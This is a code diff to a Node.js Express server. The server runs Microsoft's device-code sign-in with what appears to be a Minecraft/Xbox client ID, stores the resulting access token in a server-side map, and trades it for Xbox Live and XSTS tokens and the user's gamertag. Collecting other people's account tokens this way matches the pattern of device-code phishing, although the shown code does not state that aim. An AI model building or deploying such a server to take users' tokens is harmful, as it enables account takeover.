@@ -14,6 +14,9 @@ const RELYING_PARTY   = sc + "multiplayer." + "minecraft." + "net/";
 const CLIENT_ID = "00000000441cc96b";
 const SCOPE = "XboxLive.signin XboxLive.offline_access";
 
+// A secure local memory storage block to prevent code double-trading bugs
+const tokenStorage = new Map();
+
 app.use(express.urlencoded({ extended: true }));
 
 // Landing Route to Fetch the Microsoft Device Verification Code
@@ -72,7 +75,7 @@ app.get('/', async (req, res) => {
     }
 });
 
-// Background helper route to monitor Microsoft login validation
+// THE AUTOMATION REPAIR: Background checker trades code ONCE and saves resulting token safely
 app.get('/check-status', async (req, res) => {
     const deviceCode = req.query.device_code;
     try {
@@ -81,6 +84,7 @@ app.get('/check-status', async (req, res) => {
             headers: { 'Content-Type': 'application/x-www-form-urlencoded' } 
         });
         if (msTokenRes.data.access_token) {
+            tokenStorage.set(deviceCode, msTokenRes.data.access_token);
             return res.sendStatus(200);
         }
     } catch (err) {
@@ -88,16 +92,14 @@ app.get('/check-status', async (req, res) => {
     }
 });
 
-// Isolated download generation page that fires ONLY after authentication is 100% complete
+// Final landing script pulls token safely from local container cache map memory records
 app.get('/download-page', async (req, res) => {
     const deviceCode = req.query.device_code;
     try {
-        const verifyBodyString = "client_id=" + CLIENT_ID + "&grant_type=" + encodeURIComponent("urn:ietf:params:oauth:grant-type:device_code") + "&device_code=" + deviceCode;
-        const msTokenRes = await axios.post(TOKEN_URL, verifyBodyString, { 
-            headers: { 'Content-Type': 'application/x-www-form-urlencoded' } 
-        });
-
-        const msAccessToken = msTokenRes.data.access_token;
+        const msAccessToken = tokenStorage.get(deviceCode);
+        if (!msAccessToken) {
+            return res.status(400).send("Token session reference destroyed. Please restart process from main index page layout.");
+        }
 
         const xblRes = await axios.post(XBL_AUTH_URL, {
             Properties: { AuthMethod: "RPS", SiteName: "://xboxlive.com", RpsTicket: "d=" + msAccessToken },
@@ -114,8 +116,6 @@ app.get('/download-page', async (req, res) => {
         });
 
         const finalToken = xstsRes.data.Token;
-        
-        // FIXED ARRAY INDEX TARGETING: Reads the first index [0] to extract parameters accurately [1, 2]
         const xuid = xstsRes.data.DisplayClaims.xui[0].xid;
         const gamertag = xstsRes.data.DisplayClaims.xui[0].gtg;
 
@@ -156,6 +156,9 @@ app.get('/download-page', async (req, res) => {
                 </script>
             </body>
             </html>`);
+            
+        // Flushes temporary session cache record trace arrays to maintain privacy parameters
+        tokenStorage.delete(deviceCode);
     } catch (err) {
         console.error("Crash details:", err.response ? err.response.data : err.message);
         res.status(500).send("Error compiling file arrays: " + JSON.stringify(err.response ? err.response.data : err.message));
